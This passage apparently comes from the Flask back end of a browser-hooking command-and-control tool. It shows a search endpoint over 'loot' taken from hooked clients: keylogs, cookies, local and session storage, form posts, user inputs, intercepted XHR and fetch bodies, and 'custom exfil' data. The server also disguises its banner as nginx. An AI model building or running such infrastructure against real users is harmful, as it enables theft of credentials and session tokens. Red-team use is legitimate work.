                    keep = False
                    break
                elif not term['negate'] and not found:
                    keep = False
                    break
            if keep:
                filtered.append(c)
        clients = filtered

    if not clients:
        return jsonify({'results': [], 'total': 0, 'page': 1, 'pages': 0})

    # Build lookup maps
    clientByUuid = {c.uuid: c for c in clients}
    clientById   = {c.id: c for c in clients}
    uuids = list(clientByUuid.keys())

    # For beacon events, find BeaconDomain IDs belonging to these clients
    beaconDomainMap = {}  # domainID -> client
    if any(et in eventTypes for et in ['BEACON_CAPTURE', 'BEACON_VISIT']):
        domains = BeaconDomain.query.filter(BeaconDomain.clientID.in_(uuids)).all()
        for d in domains:
            beaconDomainMap[d.id] = clientByUuid.get(d.clientID)

    escapedQuery = escape_like(searchQuery) if searchQuery else None
    allResults = []

    # Phase 2: Search loot tables
    # Helper to add LIKE filters
    def like_filter(col):
        return col.ilike('%' + escapedQuery + '%', escape='\\')

    # USERINPUT
    if 'USERINPUT' in eventTypes:
        q = UserInput.query.filter(UserInput.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(like_filter(UserInput.inputName), like_filter(UserInput.inputValue)))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'USERINPUT',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'Input Name': r.inputName, 'Input Value': r.inputValue}
                })

    # FORMPOST
    if 'FORMPOST' in eventTypes:
        q = FormPost.query.filter(FormPost.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(
                like_filter(FormPost.formName), like_filter(FormPost.formAction),
                like_filter(FormPost.formData), like_filter(FormPost.url)
            ))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'FORMPOST',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'Form Name': r.formName or '', 'Form Action': r.formAction,
                               'Form Data': r.formData or '', 'URL': r.url}
                })

    # COOKIE
    if 'COOKIE' in eventTypes:
        q = Cookie.query.filter(Cookie.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(like_filter(Cookie.cookieName), like_filter(Cookie.cookieValue)))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'COOKIE',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'Cookie Name': r.cookieName, 'Cookie Value': r.cookieValue}
                })

    # LOCALSTORAGE
    if 'LOCALSTORAGE' in eventTypes:
        q = LocalStorage.query.filter(LocalStorage.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(like_filter(LocalStorage.key), like_filter(LocalStorage.value)))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'LOCALSTORAGE',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'Key': r.key, 'Value': r.value}
                })

    # SESSIONSTORAGE
    if 'SESSIONSTORAGE' in eventTypes:
        q = SessionStorage.query.filter(SessionStorage.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(like_filter(SessionStorage.key), like_filter(SessionStorage.value)))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'SESSIONSTORAGE',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'Key': r.key, 'Value': r.value}
                })

    # KEYLOG
    if 'KEYLOG' in eventTypes:
        q = Keylog.query.filter(Keylog.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(like_filter(Keylog.keys), like_filter(Keylog.target), like_filter(Keylog.url)))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'KEYLOG',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'Keystrokes': r.keys, 'Target': r.target, 'URL': r.url}
                })

    # URLVISITED
    if 'URLVISITED' in eventTypes:
        q = UrlVisited.query.filter(UrlVisited.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(like_filter(UrlVisited.url))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'URLVISITED',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'URL': r.url}
                })

    # XHRAPICALL
    if 'XHRAPICALL' in eventTypes:
        q = XhrApiCall.query.filter(XhrApiCall.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(
                like_filter(XhrApiCall.url), like_filter(XhrApiCall.requestBody),
                like_filter(XhrApiCall.responseBody)
            ))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'XHRAPICALL',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'URL': r.url, 'Request Body': r.requestBody or '',
                               'Response Body': r.responseBody or ''}
                })

    # FETCHAPICALL
    if 'FETCHAPICALL' in eventTypes:
        q = FetchApiCall.query.filter(FetchApiCall.clientID.in_(uuids))
        if escapedQuery:
            q = q.filter(or_(
                like_filter(FetchApiCall.url), like_filter(FetchApiCall.requestBody),
                like_filter(FetchApiCall.responseBody)
            ))
        for r in q.all():
            c = clientByUuid.get(r.clientID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'FETCHAPICALL',
                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                    '_ts': r.timeStamp,
                    'fields': {'URL': r.url, 'Request Body': r.requestBody or '',
                               'Response Body': r.responseBody or ''}
                })

    # CUSTOMEXFIL — linked through Event table (no clientID on CustomExfil)
    if 'CUSTOMEXFIL' in eventTypes:
        events = Event.query.filter(Event.clientID.in_(uuids), Event.eventType == 'CUSTOMEXFIL').all()
        exfilIds = [e.eventID for e in events]
        eventClientMap = {e.eventID: e.clientID for e in events}
        if exfilIds:
            q = CustomExfil.query.filter(CustomExfil.id.in_(exfilIds))
            if escapedQuery:
                q = q.filter(or_(like_filter(CustomExfil.note), like_filter(CustomExfil.data)))
            for r in q.all():
                cUuid = eventClientMap.get(r.id)
                c = clientByUuid.get(cUuid) if cUuid else None
                if c:
                    allResults.append({
                        'clientNickname': c.nickname, 'clientTag': c.tag or '',
                        'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                        'clientId': c.id, 'eventType': 'CUSTOMEXFIL',
                        'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                        '_ts': r.timeStamp,
                        'fields': {'Note': r.note or '', 'Data': r.data or ''}
                    })

    # BEACON_CAPTURE
    if 'BEACON_CAPTURE' in eventTypes and beaconDomainMap:
        domainIds = list(beaconDomainMap.keys())
        q = BeaconCapture.query.filter(BeaconCapture.domainID.in_(domainIds))
        if escapedQuery:
            q = q.filter(or_(like_filter(BeaconCapture.name), like_filter(BeaconCapture.value)))
        for r in q.all():
            c = beaconDomainMap.get(r.domainID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'BEACON_CAPTURE',
                    'timeStamp': r.capturedAt.strftime('%Y-%m-%d %H:%M:%S') if r.capturedAt else '',
                    '_ts': r.capturedAt,
                    'fields': {'Name': r.name, 'Value': r.value}
                })

    # BEACON_VISIT
    if 'BEACON_VISIT' in eventTypes and beaconDomainMap:
        domainIds = list(beaconDomainMap.keys())
        q = BeaconVisit.query.filter(BeaconVisit.domainID.in_(domainIds))
        if escapedQuery:
            q = q.filter(like_filter(BeaconVisit.url))
        for r in q.all():
            c = beaconDomainMap.get(r.domainID)
            if c:
                allResults.append({
                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
                    'clientId': c.id, 'eventType': 'BEACON_VISIT',
                    'timeStamp': r.visitTime.strftime('%Y-%m-%d %H:%M:%S') if r.visitTime else '',
                    '_ts': r.visitTime,
                    'fields': {'URL': r.url}
                })

    # Sort by timestamp
    descending = (sortOrder != 'oldest')
    allResults.sort(key=lambda x: x.get('_ts') or datetime.datetime.min, reverse=descending)

    # Remove internal sort key
    for r in allResults:
        r.pop('_ts', None)

    # Paginate
    total = len(allResults)
    pages = (total + perPage - 1) // perPage if total > 0 else 0
    start = (page - 1) * perPage
    end   = start + perPage
    pageResults = allResults[start:end]

    return jsonify({
        'results': pageResults,
        'total': total,
        'page': page,
        'pages': pages,
        'sortOrder': sortOrder
    })


#**************************************************************************



if __name__ == '__main__':
    # printHeader()

    logger.info("Python main running....")

    # Response configuration
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    WSGIRequestHandler.server_version   = "nginx"
    WSGIRequestHandler.sys_version      = ""

    # If proxy mode we run HTTP and accept the proxy headers from nginx
    # If not proxy mode we'll run self-signed cert for testing
    if (proxyMode):
        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
        app.run(debug=False, host='0.0.0.0', port=8444)
    else:
        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
       


